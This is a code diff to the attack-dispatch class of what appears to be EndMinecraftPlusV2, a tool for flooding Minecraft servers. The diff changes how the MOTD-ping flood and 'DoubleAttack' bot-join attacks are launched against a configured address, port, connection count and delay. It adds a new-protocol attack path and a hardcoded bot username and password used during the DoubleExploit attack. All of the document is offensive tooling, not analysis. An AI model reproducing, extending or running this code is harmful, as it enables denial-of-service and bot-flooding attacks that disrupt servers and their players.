@@ -15,6 +15,7 @@ import java.util.Map;
 import java.util.Random;
 
 public class AttackManager {
+    public static Boolean isDoubleAttack = false;
     public static void doAttack() {
         LogUtil.emptyLog();
 
@@ -57,37 +58,33 @@ public class AttackManager {
                 break;
             case 2:
                 // MotdAttack
-                if (ProtocolLibs.highVersion) {
-                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.IAttack motdAttack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
-                    motdAttack.start();
-                } else {
-                    IAttack motdAttack = new MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
-                    motdAttack.start();
-                }
-
+                IAttack motdAttack = new MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
+                motdAttack.start();
                 break;
             case 3:
                 // MotdAttackP
-                if (ProtocolLibs.highVersion) {
-                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.IAttack motdAttackP = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
-                    motdAttackP.start();
-                } else {
-                    IAttack motdAttackP = new MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
-                    motdAttackP.start();
-                }
-
+                IAttack motdAttackP = new MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
+                motdAttackP.start();
                 break;
             case 4:
                 // DoubleAttack
                 Map<String, String> doubleModList = new HashMap<>();
+                isDoubleAttack = true;
 
                 if (ProtocolLibs.highVersion) {
                     LogUtil.doLog(0, "当前选定协议库版本不支持获取Forge Mods。", "DoubleAttack");
 
-                    cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
-                    attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
-                    attack.setUsername(ConfigUtil.DoubleExploitPlayer);
-                    attack.start();
+                    if (ProtocolLibs.adaptAfter754) {
+                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewDoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewDoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
+                        attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
+                        attack.setUsername(ConfigUtil.DoubleExploitPlayer);
+                        attack.start();
+                    } else {
+                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
+                        attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
+                        attack.setUsername(ConfigUtil.DoubleExploitPlayer);
+                        attack.start();
+                    }
                 } else {
                     if (!MCForge.isAfterVersion1_13()) {
                         LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "DoubleAttack");
@@ -109,6 +106,10 @@ public class AttackManager {
     }
 
     public static String getRandomUser() {
+        if (isDoubleAttack) {
+            return ConfigUtil.DoubleExploitPlayer + "@12345678Aa!";
+        }
+
         return DataUtil.botRegPasswords.get(new Random().nextInt(DataUtil.botRegPasswords.size()));
     }
 }
